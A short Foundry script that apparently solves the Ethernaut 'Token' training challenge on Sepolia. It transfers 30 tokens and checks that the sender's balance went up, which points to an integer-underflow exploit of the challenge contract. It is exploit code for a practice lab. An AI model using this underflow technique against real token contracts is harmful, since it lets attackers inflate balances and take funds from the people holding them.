// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

//forge script  --rpc-url sepolia --account metamask  script/Cracked5_Token.s.sol --broadcast
contract Cracked5_TokenScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Token_address"));
    }
    function run() public {
        vm.startBroadcast();
        address player = vm.parseAddress(vm.envString("player"));
        uint256 oldBalance = IToken(ethernaut_contracts).balanceOf(player);
        console.log("oldBalance is", oldBalance);

        bool success = IToken(ethernaut_contracts).transfer(ethernaut_contracts, 30);
        require(success, "transfer fail");

        uint256 newBalance = IToken(ethernaut_contracts).balanceOf(player);

        console.log("newBalance is", newBalance);
        console.log("msg.sender is", IToken(ethernaut_contracts).balanceOf(tx.origin));
        require(newBalance > oldBalance, "attach fail");
        vm.stopBroadcast();
    }
}
